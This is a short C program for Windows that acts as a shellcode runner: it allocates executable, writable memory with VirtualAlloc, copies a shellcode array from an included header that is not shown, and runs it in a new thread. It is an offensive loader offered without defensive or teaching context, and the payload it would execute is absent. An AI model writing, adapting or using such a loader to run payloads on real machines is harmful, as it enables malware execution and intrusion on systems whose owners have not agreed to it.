#include <Windows.h>
#include <stdio.h>
#include "shellcode.h"

int main()
{
    // Allocate memory for the shellcode
    PVOID exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    // Copy shellcode to allocated memory
    RtlMoveMemory(exec, shellcode, sizeof(shellcode));

    // Create a thread to run it
    HANDLE thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);

    // Wait until shellcode execution is done
    WaitForSingleObject(thread, INFINITE);

    return 0;
}